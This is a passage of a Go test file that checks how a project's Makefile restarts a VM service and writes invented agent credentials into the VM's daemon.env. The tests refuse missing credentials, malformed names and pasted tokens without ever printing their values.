// Pins the deck's setup on a new VM (issue #234): make deck-restart reloads the service's drop-ins before it
// restarts the daemon, so a changed drop-in takes effect, and make vm-env refuses to rebuild the VM's
// daemon.env unless every credential its VM_ENV names is in the environment, so a locked login Keychain or an
// unloaded direnv .envrc never wipes the credentials the agents need. VM_ENV itself decides what happens to the
// file (decision recorded on issue #234): the default VM_ENV replaces the whole file, so no stale line - an old
// ANTHROPIC_API_KEY, say, which silently switches Claude Code to pay-as-you-go billing - survives a run, and
// only a VM_ENV given on the make command line merges: it replaces only the names it lists and keeps the plain
// NAME=value lines already in the file. A VM_ENV exported in the environment replaces the whole file too: a
// VM_ENV left behind in a .envrc must not silently keep a stale credential alive (the second-round review of
// issue #234). A VM_ENV the shell would not read as one word is refused before any shell expands it, and a
// merge copies only lines that are plain NAME=value assignments, warning that it dropped the rest.
//
// No test reaches the machine it runs on: the sandbox's fake limactl runs the VM side of every target on this
// machine with the fake VM user's HOME, and systemctl is a recording fake. No value in this file is a real
// credential: the tests invent every one of them (CLAUDE.md rule 3).
package devenv_test

import (
	"errors"
	"io/fs"
	"os"
	"path/filepath"
	"regexp"
	"slices"
	"strconv"
	"strings"
	"testing"
	"time"

	"github.com/google/go-cmp/cmp"
)

// vmEnvCredentials are the names make vm-env copies into the VM by default, in VM_ENV's order (Makefile),
// after PRD #161 milestone 3: the maintainer's personal GITHUB_TOKEN left the VM, and the agents push with the
// agents App's token, which the gh wrapper hands the real gh (dev/gh-app-token.sh). No case in this file treats
// GITHUB_TOKEN as a credential of the agents any more.
var vmEnvCredentials = []string{"CLAUDE_CODE_OAUTH_TOKEN", "DEEPSEEK_API_KEY"}

// fakeEnvValue is the invented value the tests give one credential: its name with a fake- prefix, so no
// literal in this file pairs a credential's name with a value (gosec G101) and none is a real credential
// (CLAUDE.md rule 3).
func fakeEnvValue(name string) string {
	return "fake-" + strings.ToLower(name) + "-value"
}

// inventedVMEnvValue builds an invented value for a VM_ENV a shell would hold by mistake, from a label: a
// value the refusal must never echo, and no literal in this file pairs a credential's name with one (gosec
// G101, CLAUDE.md rule 3).
func inventedVMEnvValue(label string) string {
	return "fake-" + label
}

// vmEnvInvalidTail returns what follows the first character VM_ENV may not hold - the part of a refused
// VM_ENV that is most likely the value a maintainer's shell built, which a refusal must never print - or the
// empty string when vmEnv holds only the characters make vm-env reads as one word (a letter, a digit, an
// underscore, a comma or a space).
func vmEnvInvalidTail(vmEnv string) string {
	for i := 0; i < len(vmEnv); i++ {
		c := vmEnv[i]

		named := c == '_' || c == ',' || c == ' ' ||
			(c >= '0' && c <= '9') || (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z')
		if !named {
			return vmEnv[i+1:]
		}
	}

	return ""
}

// fakePastedTokenEntry returns an entry of the shape a maintainer pastes into VM_ENV where a name was meant: a
// GitHub token, whose lower-case prefix passes a check for a variable name. Its body is invented from label, so
// no literal in this file is a credential (gosec G101, CLAUDE.md rule 3) and a test can look for its exact text.
func fakePastedTokenEntry(label string) string {
	return "ghp_FAKEFAKE" + strings.ToUpper(strings.ReplaceAll(label, "-", "")) + "NOTAREALTOKEN"
}

// fakeDigitFirstEntry returns a VM_ENV entry that is no variable name because it starts with a digit, built from a
// label the same way, so it is obviously invented and no literal in this file pairs a name with a value (gosec
// G101, CLAUDE.md rule 3).
func fakeDigitFirstEntry(label string) string {
	return "1FAKEFAKE" + strings.ToUpper(strings.ReplaceAll(label, "-", "")) + "NOTAREALTOKEN"
}

// fakeLowerCaseName returns an invented VM_ENV entry that is a valid variable name but not the shape of a
// credential name, which is upper case: a message may give its 1-based position in VM_ENV, never its text (issue
// #268 L1).
func fakeLowerCaseName(label string) string {
	return "fake_" + strings.ReplaceAll(label, "-", "_")
}

// mistakenEntrySentence is the sentence a message adds about an entry of VM_ENV whose text it does not show: where
// a name was meant the maintainer may have pasted the credential itself (issue #268). It is lower case, so a
// comparison against a lower-cased text matches it whatever the sentence's own capitalisation. The name says what
// the sentence is for rather than what it mentions, so gosec's hardcoded-credential rule (G101) does not read it as
// one.
const mistakenEntrySentence = "may be a credential typed by mistake"

// mistakenEntrySentenceCount returns how many times the sentence appears in text, ignoring case.
func mistakenEntrySentenceCount(text string) int {
	return strings.Count(strings.ToLower(text), mistakenEntrySentence)
}

// assertNoCredentialHint fails when a line of text that names one of names carries the sentence: the sentence
// belongs to the message about the entry of VM_ENV that is not shown, and never to a message about a name that is
// shown, where it would tell a maintainer that the credential they named is a credential typed by mistake (issue
// #268).
func assertNoCredentialHint(t *testing.T, where, text string, names []string, why string) {
	t.Helper()

	for _, line := range strings.Split(text, "\n") {
		named := slices.ContainsFunc(names, func(name string) bool { return strings.Contains(line, name) })
		if !named || !strings.Contains(strings.ToLower(line), mistakenEntrySentence) {
			continue
		}

		t.Errorf("%s carries %q in a line that names %s although %s: the sentence belongs to the message about the entry of VM_ENV that is not shown, and a maintainer reading about a name that is shown must not be told that that name may be a credential typed by mistake (issue #268):\nstdout and stderr: %s",
			where, mistakenEntrySentence, strings.Join(names, ", "), why, text)
	}
}

// assertHiddenEntrySaysMayBeACredential fails unless the message that gives the 1-based position at of the hidden
// entry of VM_ENV carries the sentence as well: that entry is where a maintainer may have pasted a credential, and
// the sentence is what says so, so hiding it must not hide why it is hidden (issue #268).
func assertHiddenEntrySaysMayBeACredential(t *testing.T, where, text string, at int, why string) {
	t.Helper()

	for _, line := range strings.Split(text, "\n") {
		if entryNotShown(at).MatchString(line) && strings.Contains(strings.ToLower(line), mistakenEntrySentence) {
			return
		}
	}

	t.Errorf("%s does not say %q in the message that gives the position of VM_ENV entry %d although %s: a hidden entry is where a maintainer may have pasted a credential, so the message that hides it must say that it may be a credential typed by mistake (issue #268):\nstdout and stderr: %s",
		where, mistakenEntrySentence, at, why, text)
}

// entryNotShown is the wording a refusal must use in place of an entry of VM_ENV it may not print: the entry's
// 1-based position in VM_ENV, and nothing of its text (issue #268 L1). Only an upper-case variable name is printed,
// because that is the shape of every credential name; anything else may be the credential itself.
func entryNotShown(at int) *regexp.Regexp {
	return regexp.MustCompile(`(?i)entry\s+` + strconv.Itoa(at) + `\s+is\s+not\s+shown`)
}

// assertEntryPositionNotShown fails when a refusal does not say, by its 1-based position in VM_ENV, which entry it
// would not print: an entry that is not an upper-case variable name may be a credential pasted into VM_ENV by
// mistake, which the refusal must neither print nor hide without a word (issue #268 L1).
func assertEntryPositionNotShown(t *testing.T, where, text string, at int, why string) {
	t.Helper()

	if entryNotShown(at).MatchString(text) {
		return
	}

	t.Errorf("%s does not say that entry %d of VM_ENV is not shown: %s. An entry that is not an upper-case variable name may be a credential pasted into VM_ENV by mistake, so the refusal must give the entry's 1-based position in VM_ENV and never its text (issue #268 L1):\nstdout and stderr: %s",
		where, at, why, text)
}

// blankLines counts the empty lines of a daemon.env, ignoring the empty string after the file's last newline.
func blankLines(body string) int {
	if body == "" {
		return 0
	}

	count := 0

	for _, line := range strings.Split(strings.TrimSuffix(body, "\n"), "\n") {
		if strings.TrimSpace(line) == "" {
			count++
		}
	}

	return count
}

// seededDaemonEnv is what the VM's daemon.env holds before a case: the credentials a previous make vm-env
// wrote. A refused run leaves exactly these bytes behind.
const seededDaemonEnv = "CLAUDE_CODE_OAUTH_TOKEN=old-oauth\nDEEPSEEK_API_KEY=old-deepseek\n"

// daemonEnvPath is the VM's ~/.config/dot-agent-deck/daemon.env, the file make vm-env writes and the
// credentials.conf drop-in reads at every start.
func (sb *sandbox) daemonEnvPath() string {
	return sb.vmPath(".config/dot-agent-deck/daemon.env")
}

// seedDaemonEnv writes the VM's daemon.env the way a previous make vm-env left it, and returns its bytes.
func (sb *sandbox) seedDaemonEnv(t *testing.T) []byte {
	t.Helper()

	return sb.seedDaemonEnvWith(t)
}

// seedDaemonEnvWith writes the VM's daemon.env as a previous make vm-env left it plus extra lines, the way a
// maintainer or an earlier target left a setting vm-env does not know about, and returns its bytes.
func (sb *sandbox) seedDaemonEnvWith(t *testing.T, extra ...string) []byte {
	t.Helper()

	body := seededDaemonEnv
	for _, line := range extra {
		body += line + "\n"
	}

	writeFileMode(t, sb.daemonEnvPath(), []byte(body), 0o600)

	return []byte(body)
}

// vmEnvEnv is the environment one run of make vm-env gets: the sandbox's PATH with the fake limactl first, a
// temporary HOME, and the three credentials with invented values. No other variable of the test process's own
// environment is passed on, so a real credential of the machine can never reach the VM (CLAUDE.md rule 3).
// VM_ENV is never one of them: where it comes from decides whether vm-env merges or replaces (issue #234), so
// a value exported in the environment of the process running the test must not stand in for one a case sets,
// and a case that wants one in the environment calls withVMEnvInEnv.
func (sb *sandbox) vmEnvEnv() map[string]string {
	env := sb.baseEnv()
	env["PATH"] = sb.binDir + ":/usr/local/bin:/usr/bin:/bin"
	delete(env, "VM_ENV")

	for _, name := range vmEnvCredentials {
		env[name] = fakeEnvValue(name)
	}

	return env
}

// withVMEnvInEnv hands VM_ENV to make in its environment instead of on the command line, the way a VM_ENV
// exported from a .envrc (or by hand) reaches it. Only a VM_ENV given on the command line merges: one that
// arrives this way must replace the whole file, so a stale credential left in a .envrc can never be kept alive
// by a merge the maintainer did not ask for (issue #234).
func withVMEnvInEnv(env map[string]string, vmEnv string) map[string]string {
	env["VM_ENV"] = vmEnv

	return env
}

// assertNoLimaCalls fails when make handed limactl anything at all. Every refusal make vm-env makes is made
// before the VM is touched, so a refused run costs no connection to the VM and writes nothing in it (issue #234).
func (sb *sandbox) assertNoLimaCalls(t *testing.T, why string) {
	t.Helper()

	log := sb.argvLogText(t)

	if calls := invocations(log, "limactl"); len(calls) > 0 {
		t.Errorf("make vm-env called limactl %d time(s) although %s: a refused run must not reach the VM at all, so nothing there can be written (issue #234):\n%s",
			len(calls), why, log)
	}
}

// daemonEnvWrittenClaim matches the line make vm-env prints once it has written the VM's daemon.env: it says the
// names it wrote and where. A refused run must never print it, or a maintainer whose credentials never reached
// the VM believes they did and starts the deck on a file that holds nothing (issue #268 L2).
var daemonEnvWrittenClaim = regexp.MustCompile(`(?i)\bwritten to\b[^\n]*daemon\.env`)

// assertNoDaemonEnvWrittenClaim fails when make's output claims that the VM's daemon.env was written, the way the
// write step reports a run that succeeded (issue #268 L2).
func assertNoDaemonEnvWrittenClaim(t *testing.T, where, text, why string) {
	t.Helper()

	if claim := daemonEnvWrittenClaim.FindString(text); claim != "" {
		t.Errorf("%s reports %q although %s: a run that refuses must never say that it wrote the VM's daemon.env, or a maintainer whose credentials never reached the VM believes they did (issue #268 L2)",
			where, claim, why)
	}
}

// assertNoCredentialValues fails when text holds the value of any credential the tests invented. The failure
// names the variable, never its value (CLAUDE.md rule 3).
func assertNoCredentialValues(t *testing.T, where, text string) {
	t.Helper()

	secrets := make([]secret, 0, len(vmEnvCredentials))
	for _, name := range vmEnvCredentials {
		secrets = append(secrets, secret{kind: "value of " + name, value: fakeEnvValue(name)})
	}

	assertNoSecrets(t, where, text, secrets)
}

// sortedEnvLines returns the non-empty lines of a daemon.env, sorted: the order of the lines is not what the
// tests pin, the set of NAME=value lines is.
func sortedEnvLines(body string) []string {
	var lines []string

	for _, line := range strings.Split(body, "\n") {
		if strings.TrimSpace(line) != "" {
			lines = append(lines, strings.TrimSpace(line))
		}
	}

	slices.Sort(lines)

	return lines
}

// TestMakeDeckRestartReloadsDropInsBeforeTheRestart pins issue #234's second half: `make deck-restart` asks the
// VM's user manager to reload the units before it restarts dot-agent-deck.service. Without the reload, a
// drop-in dev/lima.yaml rewrote stays unread, and deck-restart warns that the unit changed on disk; with the
// restart and no reload, the daemon comes back with the old settings.
func TestMakeDeckRestartReloadsDropInsBeforeTheRestart(t *testing.T) {
	t.Parallel()

	sb := newSandbox(t)
	sb.useFakeSystemctl(t)

	env := sb.baseEnv()
	env["PATH"] = sb.binDir + ":/usr/local/bin:/usr/bin:/bin"

	stdout, stderr, err := runMake(t, []string{"deck-restart"}, env)
	if err != nil {
		t.Fatalf("make deck-restart: %v\nstdout: %s\nstderr: %s", err, stdout, stderr)
	}

	var got []string

	for _, args := range invocations(sb.argvLogText(t), "systemctl") {
		got = append(got, "systemctl "+strings.Join(args, " "))
	}

	// The reload first, then the restart: a drop-in is read by the reload, and a reload after the restart would
	// leave the running daemon on the old settings until the next one.
	want := []string{
		"systemctl --user daemon-reload",
		"systemctl --user restart dot-agent-deck.service",
	}

	if diff := cmp.Diff(want, got); diff != "" {
		t.Errorf("make deck-restart asks the VM's user manager for (-want +got):\n%s\nIt must run `systemctl --user daemon-reload` before `systemctl --user restart dot-agent-deck.service`, so a drop-in dev/lima.yaml rewrote takes effect (issue #234)", diff)
	}
}

// TestMakeVMEnvRefusesMissingCredentials pins issue #234's third half: make vm-env checks every name in VM_ENV
// before it writes anything, and refuses when one is unset or empty, naming it and leaving the VM's daemon.env
// byte for byte as it was. A locked login Keychain or an unloaded direnv .envrc in an SSH session used to write
// an empty file, and every agent started without CLAUDE_CODE_OAUTH_TOKEN after the next deck-restart.
func TestMakeVMEnvRefusesMissingCredentials(t *testing.T) {
	t.Parallel()

	cases := []struct {
		name  string
		unset []string // names left out of make's environment entirely
		empty []string // names make sees as the empty string
		named []string // names the refusal must print
	}{
		{
			name:  "one credential unset",
			unset: []string{"CLAUDE_CODE_OAUTH_TOKEN"},
			named: []string{"CLAUDE_CODE_OAUTH_TOKEN"},
		},
		{
			name:  "one credential set to an empty string",
			empty: []string{"DEEPSEEK_API_KEY"},
			named: []string{"DEEPSEEK_API_KEY"},
		},
		{
			name:  "every credential unset",
			unset: vmEnvCredentials,
			named: vmEnvCredentials,
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()

			sb := newSandbox(t)
			env := sb.vmEnvEnv()

			for _, name := range tc.unset {
				delete(env, name)
			}

			for _, name := range tc.empty {
				env[name] = ""
			}

			seeded := sb.seedDaemonEnv(t)

			stdout, stderr, err := runMake(t, []string{"vm-env"}, env)
			if err == nil {
				t.Fatalf("make vm-env exited 0 with %s missing: it must refuse, so the VM keeps the credentials it has instead of getting a daemon.env without them (issue #234)\nstdout: %s\nstderr: %s",
					strings.Join(tc.named, ", "), stdout, stderr)
			}

			for _, name := range tc.named {
				if !strings.Contains(stdout+stderr, name) {
					t.Errorf("the refusal does not name %s, so a maintainer cannot tell which credential is missing:\nstdout: %s\nstderr: %s", name, stdout, stderr)
				}
			}

			got, readErr := os.ReadFile(sb.daemonEnvPath())
			if readErr != nil {
				t.Fatalf("read the VM's daemon.env after a refused make vm-env: %v", readErr)
			}

			if diff := cmp.Diff(string(seeded), string(got)); diff != "" {
				t.Errorf("make vm-env rewrote the VM's daemon.env although it refused: the file must be byte for byte what it was (issue #234) (-want +got):\n%s", diff)
			}

			// A refusal before the VM is touched at all: nothing handed limactl writes daemon.env, because
			// nothing is handed limactl.
			sb.assertNoLimaCalls(t, "a missing credential is refused")

			// vm-env speaks for itself only: whether a VM exists is make vm-create's to report, so its line
			// must not appear here (issue #258).
			assertVMCreateDidNotSayNothingWasCreated(t, "make vm-env's refusal", stdout+stderr,
				"vm-env creates no VM either way, and the line is vm-create's own")

			assertNoCredentialValues(t, "make vm-env's output", stdout+stderr)
		})
	}
}

// TestMakeVMEnvRefusesANameThatIsNotAVariable pins the other refusal make vm-env makes before it writes
// anything (issue #234): a VM_ENV name that is not a shell identifier - it starts with a digit, or holds a
// character a variable name may not have - is refused instead of written into daemon.env, where the line
// would be meaningless and printenv could never have set it. Every credential is set, so the refusal is
// about the name and not about a missing credential, and the file stays byte for byte as it was.
//
// What the refusal may show differs between the two checks. A value holding a character the character class
// refuses is never echoed at all - not even the offending name - because it may be a credential a maintainer
// pasted into VM_ENV by mistake (issue #234 audit L1). A value that got past the character class and is
// refused per name held nothing but names, commas and spaces, so naming the offending name back reveals no
// credential and is what the maintainer needs to see.
//
// Issue #268's L1 narrowed that: only an upper-case variable name is a credential name, so the per-name refusal
// prints an entry only when it matches ^[A-Z_][A-Z0-9_]*$ and otherwise its 1-based position in VM_ENV - "entry 1
// is not shown". A dash or a dot never reaches this per-name check (the character class refuses VM_ENV first,
// issue #234 audit L1), so the entry the per-name check sees is the one starting with a digit - which may be a
// credential a maintainer pasted where a name goes.
func TestMakeVMEnvRefusesANameThatIsNotAVariable(t *testing.T) {
	t.Parallel()

	cases := []struct {
		name   string
		vmEnv  string // the invented name handed to VM_ENV; no variable of the test machine is ever named so
		reason string
		// perName is whether the per-name check refuses this entry rather than the character class: the class
		// refuses a dash or a dot before the name is looked at, showing none of VM_ENV, while the entry
		// starting with a digit reaches the per-name check, which gives its position (issue #268 L1).
		perName bool
	}{
		{
			name:    "the name starts with a digit",
			vmEnv:   "1INVENTED_TOKEN",
			reason:  "a name may not start with a digit",
			perName: true,
		},
		{
			name:   "the name holds a dash",
			vmEnv:  "INVENTED-TOKEN",
			reason: "a variable name never holds a dash",
		},
		{
			name:   "the name holds a dot",
			vmEnv:  "INVENTED.TOKEN",
			reason: "a variable name never holds a dot",
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()

			sb := newSandbox(t)
			env := sb.vmEnvEnv()

			// The credentials VM_ENV lists are all set, so a refusal can only be about tc.vmEnv.
			seeded := sb.seedDaemonEnv(t)

			stdout, stderr, err := runMake(t, []string{"vm-env", "VM_ENV=" + tc.vmEnv}, env)
			if err == nil {
				t.Fatalf("make vm-env VM_ENV=%s exited 0: it must refuse a name that is not a variable (%s), so no line printenv could never set reaches daemon.env (issue #234)\nstdout: %s\nstderr: %s",
					tc.vmEnv, tc.reason, stdout, stderr)
			}

			text := stdout + stderr

			if !strings.Contains(text, "VM_ENV") {
				t.Errorf("the refusal does not name VM_ENV, so a maintainer cannot tell that the VM_ENV they passed is what vm-env refused (%s):\nstdout: %s\nstderr: %s",
					tc.reason, stdout, stderr)
			}

			if tc.perName {
				// The entry's position, and nothing of its text: it may be where a maintainer pasted a credential.
				assertEntryPositionNotShown(t, "make vm-env's refusal", text, 1, tc.reason)
			} else if !strings.Contains(strings.ToLower(text), "not shown") {
				t.Errorf("the refusal does not say that VM_ENV's value is not shown, so a maintainer cannot tell whether the value they handed vm-env was echoed (%s) (issue #234 audit L1):\nstdout: %s\nstderr: %s",
					tc.reason, stdout, stderr)
			}

			assertNoSecrets(t, "make vm-env's refusal", text, []secret{
				{kind: "VM_ENV entry it was given", value: tc.vmEnv},
			})

			got, readErr := os.ReadFile(sb.daemonEnvPath())
			if readErr != nil {
				t.Fatalf("read the VM's daemon.env after a refused make vm-env: %v", readErr)
			}

			if diff := cmp.Diff(string(seeded), string(got)); diff != "" {
				t.Errorf("make vm-env rewrote the VM's daemon.env although it refused %s: the file must be byte for byte what it was (issue #234) (-want +got):\n%s",
					tc.vmEnv, diff)
			}

			// A refusal before the VM is touched at all: nothing handed limactl writes daemon.env, because
			// nothing is handed limactl.
			sb.assertNoLimaCalls(t, "a name that is not a variable is refused")

			assertNoCredentialValues(t, "make vm-env's output", stdout+stderr)
		})
	}
}

// TestMakeVMEnvRefusalGivesOnlyThePositionOfAnEntryItMayNotPrint pins issue #268's L1 (security): make
// vm-env-check, and so make vm-env and make vm-create, lists the VM_ENV entries it refuses. An entry that is not
// an upper-case variable name - every credential name is upper case - may be the credential itself, pasted where
// a name goes by mistake, so the refusal must print only its 1-based position in VM_ENV: "entry 2 is not shown".
// Two entries reach a message that prints them today. A lower-case token spelling (ghp_...) is a valid variable
// name, so it passes the per-name checks and is printed in the "not set or empty" list. One starting with a digit
// is refused as no variable name, and the message prints it. Both are invented here, and the failure names neither
// of them (CLAUDE.md rule 3).
func TestMakeVMEnvRefusalGivesOnlyThePositionOfAnEntryItMayNotPrint(t *testing.T) {
	t.Parallel()

	cases := []struct {
		name  string
		vmEnv string   // the VM_ENV handed to make on its command line
		unset []string // names left out of make's environment, so they are the ones the refusal is about
		at    int      // the 1-based position in VM_ENV of the entry the refusal may not print
		entry string   // that entry, whose text no output may hold
		named []string // real credential names the refusal must still print
		// wantLower are substrings the refusal must hold, compared case-insensitively.
		wantLower []string
		reason    string
	}{
		{
			name:      "a pasted token in the not set or empty list",
			vmEnv:     "CLAUDE_CODE_OAUTH_TOKEN," + fakePastedTokenEntry("oauth"),
			unset:     []string{fakePastedTokenEntry("oauth")},
			at:        2,
			entry:     fakePastedTokenEntry("oauth"),
			wantLower: []string{"not set or empty"},
			reason:    "a token pasted where a name goes is a valid variable name, so the missing-credential list prints it in full",
		},
		{
			name:      "a pasted token next to a real name that is unset",
			vmEnv:     fakePastedTokenEntry("deepseek") + ",DEEPSEEK_API_KEY",
			unset:     []string{"DEEPSEEK_API_KEY", fakePastedTokenEntry("deepseek")},
			at:        1,
			entry:     fakePastedTokenEntry("deepseek"),
			named:     []string{"DEEPSEEK_API_KEY"},
			wantLower: []string{"not set or empty"},
			reason:    "an entry that is not a credential name is hidden, while a real credential name that is unset is still named",
		},
		{
			name:      "an entry that starts with a digit",
			vmEnv:     "CLAUDE_CODE_OAUTH_TOKEN," + fakeDigitFirstEntry("api"),
			unset:     []string{fakeDigitFirstEntry("api")},
			at:        2,
			entry:     fakeDigitFirstEntry("api"),
			wantLower: []string{"not a variable name"},
			reason:    "the not-a-variable-name message prints the entry it refuses, which may be a credential pasted where a name goes",
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()

			sb := newSandbox(t)
			env := sb.vmEnvEnv()

			for _, name := range tc.unset {
				delete(env, name)
			}

			seeded := sb.seedDaemonEnv(t)

			stdout, stderr, err := runMake(t, []string{"vm-env", "VM_ENV=" + tc.vmEnv}, env)
			if err == nil {
				t.Fatalf("make vm-env exited 0 with an entry of VM_ENV that names no credential the environment holds: it must refuse, because %s (issue #268 L1)\nstdout: %s\nstderr: %s",
					tc.reason, stdout, stderr)
			}

			text, lower := stdout+stderr, strings.ToLower(stdout+stderr)

			// What the refusal says instead of the entry: its 1-based position in VM_ENV (issue #268 L1).
			assertEntryPositionNotShown(t, "make vm-env's refusal", text, tc.at, tc.reason)

			// And nothing of the entry itself. The failure names the entry's kind, never its text: the very
			// thing that must not reach the output must not reach a test report either (CLAUDE.md rule 3).
			assertNoSecrets(t, "make vm-env's refusal", text, []secret{
				{kind: "VM_ENV entry at position " + strconv.Itoa(tc.at), value: tc.entry},
			})

			// A real credential name is still named: hiding an entry that may be a credential must not hide the
			// one name a maintainer has to fix (issue #234, #256, #265).
			for _, name := range tc.named {
				if !strings.Contains(text, name) {
					t.Errorf("the refusal does not name %s, so a maintainer cannot tell which real credential is missing: hiding an entry that may be a credential must hide only that entry (issue #268 L1):\nstdout: %s\nstderr: %s",
						name, stdout, stderr)
				}
			}

			for _, want := range tc.wantLower {
				if !strings.Contains(lower, want) {
					t.Errorf("the refusal does not say %q, so a maintainer cannot tell why it stopped (issue #268 L1):\nstdout: %s\nstderr: %s",
						want, stdout, stderr)
				}
			}

			got, readErr := os.ReadFile(sb.daemonEnvPath())
			if readErr != nil {
				t.Fatalf("read the VM's daemon.env after a refused make vm-env: %v", readErr)
			}

			if diff := cmp.Diff(string(seeded), string(got)); diff != "" {
				t.Errorf("make vm-env rewrote the VM's daemon.env although it refused an entry of VM_ENV: the file must be byte for byte what it was (-want +got):\n%s", diff)
			}

			// The refusal is made on the host: nothing handed limactl, so nothing written there.
			sb.assertNoLimaCalls(t, "VM_ENV holds an entry that names no credential")

			assertNoCredentialValues(t, "make vm-env's output", text)
		})
	}
}

// TestMakeVMEnvWritesNothingForAMissingCredentialUnderDashI pins issue #268's L2 (defence in depth): `make -i
// vm-env` ignores the failed host-side check, so the write step runs on its own and used to write NAME= for a
// credential the environment does not hold - replacing the value the VM already had with an empty one, which is
// the wipe issue #234 closed for the plain run. The write step must refuse an empty value itself: the VM's
// daemon.env stays byte for byte as it was, so no agent starts without the credential.
func TestMakeVMEnvWritesNothingForAMissingCredentialUnderDashI(t *testing.T) {
	t.Parallel()

	cases := []struct {
		name  string
		unset []string // names left out of make's environment entirely
		empty []string // names make sees as the empty string
	}{
		{name: "one credential unset", unset: []string{"CLAUDE_CODE_OAUTH_TOKEN"}},
		{name: "one credential set to an empty string", empty: []string{"DEEPSEEK_API_KEY"}},
		{name: "every credential unset", unset: vmEnvCredentials},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()

			sb := newSandbox(t)
			env := sb.vmEnvEnv()

			for _, name := range tc.unset {
				delete(env, name)
			}

			for _, name := range tc.empty {
				env[name] = ""
			}

			seeded := sb.seedDaemonEnv(t)

			// -i: make runs vm-env's recipe although vm-env-check failed, the way a maintainer whose login
			// Keychain is locked in an SSH session can reach the write step at all.
			stdout, stderr, err := runMake(t, []string{"-i", "vm-env"}, env)

			got, readErr := os.ReadFile(sb.daemonEnvPath())
			if readErr != nil {
				t.Fatalf("read the VM's daemon.env after make -i vm-env: %v", readErr)
			}

			if diff := cmp.Diff(string(seeded), string(got)); diff != "" {
				t.Errorf("make -i vm-env rewrote the VM's daemon.env although a credential it names is missing: the write step must refuse an empty value too, or the failed check is undone and the VM loses the value it had (issue #268 L2) (-want +got):\n%s\nmake's exit error: %v\nstdout: %s\nstderr: %s",
					diff, err, stdout, stderr)
			}

			// The exact write the wipe was: a NAME= line for a credential the environment does not hold.
			lines := sortedEnvLines(string(got))

			for _, name := range append(slices.Clone(tc.unset), tc.empty...) {
				if slices.Contains(lines, name+"=") {
					t.Errorf("make -i vm-env wrote a %s line without a value into the VM's daemon.env, replacing the value the VM had: the write step must refuse an empty value, so a run that passed no credential writes nothing (issue #268 L2). The lines it wrote: %v",
						name, lines)
				}
			}

			assertNoCredentialValues(t, "make -i vm-env's output", stdout+stderr)
		})
	}
}

// TestMakeVMEnvWritesNothingForAnEmptyVMEnvUnderDashI pins the second-round review's finding on issue #268 L2
// (defence in depth): `make -i vm-env` with a VM_ENV that names no credential - exported as the empty string, or
// as separators alone - runs the write step although vm-env-check refused, and the write step's loop runs over no
// name at all. It then sends an empty file to the VM, which replaces the whole daemon.env with a blank line: the
// wipe issue #234 closed for the plain run, and the run even reports that it wrote the file. The write step must
// refuse a VM_ENV that names nothing itself, in both the empty and the separators-only shape.
//
// make -i reports success for the recipe either way - it ignores every failed recipe, so the exit status says
// nothing here - so the test pins what a maintainer reads and what the VM is left with: the file, and an output
// that never claims a write.
func TestMakeVMEnvWritesNothingForAnEmptyVMEnvUnderDashI(t *testing.T) {
	t.Parallel()

	cases := []struct {
		name  string
		vmEnv string // the VM_ENV make finds in its environment, exported rather than given on the command line
	}{
		{name: "VM_ENV exported as the empty string", vmEnv: ""},
		{name: "VM_ENV exported as one comma", vmEnv: ","},
		{name: "VM_ENV exported as separators only", vmEnv: " , , "},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()

			sb := newSandbox(t)
			env := withVMEnvInEnv(sb.vmEnvEnv(), tc.vmEnv)
			seeded := sb.seedDaemonEnv(t)

			stdout, stderr, err := runMake(t, []string{"-i", "vm-env"}, env)
			text := stdout + stderr

			got, readErr := os.ReadFile(sb.daemonEnvPath())
			if readErr != nil {
				t.Fatalf("read the VM's daemon.env after make -i vm-env with a VM_ENV that names no credential: %v", readErr)
			}

			if diff := cmp.Diff(string(seeded), string(got)); diff != "" {
				t.Errorf("make -i vm-env rewrote the VM's daemon.env although the VM_ENV it read names no credential: the write step must refuse an empty list of names too, or the failed check is undone and the VM is left with a file - here a blank line - that starts no agent (issue #268 L2) (-want +got):\n%s\nmake's exit error: %v\nstdout: %s\nstderr: %s",
					diff, err, stdout, stderr)
			}

			assertNoDaemonEnvWrittenClaim(t, "make -i vm-env's output", text, "the VM_ENV it read names no credential, so nothing was written")

			assertNoCredentialValues(t, "make -i vm-env's output", text)
		})
	}
}

// TestMakeVMEnvWritesNothingForARefusedNameUnderDashI pins the second-round review's and audit's other finding on
// issue #268 L2: under make -i the write step runs although vm-env-check refused an entry of VM_ENV, and it
// re-checks only that the value is set and made of the characters a value may hold. A name vm-env-check refuses
// for what it is - a GitHub token (github_token_names in the Makefile) or one of the agents App's variables - or
// that names no credential the agents need is then copied into the VM anyway, so the personal token the VM was
// cleared of in PRD #161 milestone 3, or the App's key that must stay on the Mac, lands in the VM's daemon.env.
// The write step must refuse such a name itself, byte for byte as it leaves a missing credential alone.
//
// make -i ignores the failed recipe and reports success, so the test pins the file, the lines in it, and the
// output: never a claim that the file was written, and never the invented value of the refused name.
func TestMakeVMEnvWritesNothingForARefusedNameUnderDashI(t *testing.T) {
	t.Parallel()

	refused := slices.Concat(gitHubTokens, []string{"SHIFT2EU_AGENTS_APP_KEY", "SHIFT2EU_AGENTS_APP_ID"})

	for _, name := range refused {
		t.Run(name, func(t *testing.T) {
			t.Parallel()

			sb := newSandbox(t)
			env := sb.vmEnvEnv()
			value := fakeEnvValue(name)
			env[name] = value

			seeded := sb.seedDaemonEnv(t)

			// The name on the command line, so the run merges: the mode the refusal has to protect, as a
			// replace would at least drop the other lines instead of keeping them beside a stale token.
			stdout, stderr, err := runMake(t, []string{"-i", "vm-env", "VM_ENV=" + name}, env)
			text := stdout + stderr

			got, readErr := os.ReadFile(sb.daemonEnvPath())
			if readErr != nil {
				t.Fatalf("read the VM's daemon.env after make -i vm-env VM_ENV=%s: %v", name, readErr)
			}

			if diff := cmp.Diff(string(seeded), string(got)); diff != "" {
				t.Errorf("make -i vm-env VM_ENV=%s rewrote the VM's daemon.env although vm-env-check refused that name and the write step must refuse it too: the failed check is otherwise undone and the VM gets a credential it must never hold (issue #268 L2) (-want +got):\n%s\nmake's exit error: %v\nstdout: %s\nstderr: %s",
					name, diff, err, stdout, stderr)
			}

			for _, line := range sortedEnvLines(string(got)) {
				if strings.HasPrefix(line, name+"=") {
